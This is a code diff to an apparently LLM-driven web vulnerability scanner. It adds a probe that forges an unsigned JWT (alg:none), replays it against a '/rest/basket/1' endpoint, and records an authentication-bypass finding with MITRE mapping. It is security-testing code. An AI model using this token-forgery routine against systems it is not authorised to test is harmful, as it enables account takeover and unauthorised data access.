@@ -22,7 +22,7 @@ from wasp.llm import OllamaClient, CompletionResponse
 from wasp.mitre import lookup as mitre_lookup
 from wasp.planner import Hypothesis
 from wasp.recon import ReconFacts
-from wasp.tools import run_tool, tools_for_class, run_http_request
+from wasp.tools import run_tool, tools_for_class, run_http_request, run_jwt_lite
 
 
 # ---------------------------------------------------------------------------
@@ -63,6 +63,53 @@ def _get_or_fetch_token(target_url: str, config: dict) -> str | None:
             return token
     except Exception:
         pass
+    return None
+
+
+def _jwt_alg_none_probe(target_url: str, config: dict) -> dict | None:
+    """
+    Deterministically test JWT algorithm confusion (alg:none): fetch a real
+    signed token, forge an unsigned copy with the same claims, and replay it
+    against an authenticated endpoint.
+
+    This is done in code rather than left to the LLM because it requires
+    three chained actions (login, forge, replay) but the probe harness only
+    allows one tool call per turn — a small model cannot chain that itself
+    and instead hallucinates evidence from unrelated errors.
+
+    Returns an evidence dict if the forged token is accepted, else None.
+    """
+    token = _get_or_fetch_token(target_url, config)
+    if not token:
+        return None
+
+    forged_raw = run_jwt_lite({"operation": "forge_none", "token": token}, config)
+    try:
+        forged_token = json.loads(forged_raw)["forged_token"]
+    except Exception:
+        return None
+
+    probe_url = target_url.rstrip("/") + "/rest/basket/1"
+    replay_args = {
+        "method":  "GET",
+        "url":     probe_url,
+        "headers": {"Authorization": f"Bearer {forged_token}"},
+    }
+    replay_raw = run_http_request(replay_args, config, timeout=15)
+    try:
+        replay = json.loads(replay_raw)
+    except Exception:
+        return None
+
+    status = replay.get("status_code")
+    body   = str(replay.get("body", ""))
+    if status == 200 and not _is_generic_error(body) and "products" in body.lower():
+        return {
+            "forged_token": forged_token,
+            "probe_url":    probe_url,
+            "status_code":  status,
+            "body":         body,
+        }
     return None
 
 
@@ -181,6 +228,32 @@ def probe_hypothesis(
                 f"{target_url.rstrip('/')}/rest/basket/2 with this token. "
                 f"A Products array in the response confirms IDOR."
             )
+
+    # --- JWT algorithm confusion: deterministic, no LLM guessing ---
+    # (requires 3 chained actions the model can't do in one tool call)
+    if hypothesis.vuln_class == "jwt_attack":
+        evidence = _jwt_alg_none_probe(target_url, config)
+        if evidence is None:
+            return None
+        mitre = mitre_lookup(hypothesis.vuln_class)
+        finding = Finding(
+            vuln_class      = hypothesis.vuln_class,
+            title           = _title_for(hypothesis.vuln_class, probe_url),
+            severity        = severity_for_class(hypothesis.vuln_class),
+            target_url      = probe_url,
+            evidence        = json.dumps(evidence)[:1500],
+            request_method  = "GET",
+            request_url     = evidence["probe_url"],
+            request_body    = "",
+            request_headers = {"Authorization": f"Bearer {evidence['forged_token']}"},
+            description     = "",
+            mitre_id        = mitre.technique_id,
+            mitre_technique = mitre.technique,
+            mitre_tactic    = mitre.tactic,
+            mitre_url       = mitre.url,
+        )
+        board.add_finding(finding)
+        return finding
 
     # --- Turn 1: LLM proposes a tool call ---
     turn1_prompt = _TURN1_PROMPT.format(
